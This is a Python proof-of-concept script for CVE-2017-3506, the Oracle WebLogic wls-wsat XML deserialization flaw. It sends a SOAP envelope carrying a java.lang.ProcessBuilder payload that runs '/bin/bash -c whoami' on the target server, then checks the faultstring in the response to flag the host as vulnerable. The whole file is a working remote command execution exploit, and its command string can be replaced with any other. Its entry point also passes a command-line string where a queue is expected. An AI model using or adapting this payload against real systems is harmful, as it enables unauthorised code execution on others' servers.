
# _*_ coding:utf-8 _*_

import sys
import requests
import re
import logging

logging.basicConfig(filename='Weblogic.log',
                    format='%(asctime)s %(message)s',
                    filemode="w", level=logging.INFO)

VUL=['CVE_2017_3506']
headers = {'user-agent': 'ceshi/0.0.1'}

def poc(url,index,queue):
    rurl=url
    if not url.startswith("http"):
        url = "http://" + url
    if "/" in url:
        url += '/wls-wsat/CoordinatorPortType'
    post_str = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>/bin/bash</string>
                </void>
                <void index="1">
                  <string>-c</string>
                </void>
				<void index="2">
                  <string>whoami</string>
                </void>
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''

    try:
        response = requests.post(url, data=post_str, verify=False, timeout=5, headers=headers)
        response = response.text
        response = re.search(r"\<faultstring\>.*\<\/faultstring\>", response).group(0)
    except Exception:
        response = ""

    if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
        logging.info('[+]{}  deserialization vulnerability:{}.'.format(rurl,VUL[index]))
        queue.put('[+]{}  deserialization vulnerability:{}.'.format(rurl,VUL[index]))
    else:
        logging.info('[-]{} not detected {}.'.format(rurl,VUL[index]))


def run(rip,rport,index,q):
    url=rip+':'+str(rport)
    poc(url=url,index=index,queue=q)

if __name__ == '__main__':
    dip = sys.argv[1]
    dport = int(sys.argv[2])
    q = sys.argv[4]
    run(dip,dport,0,q)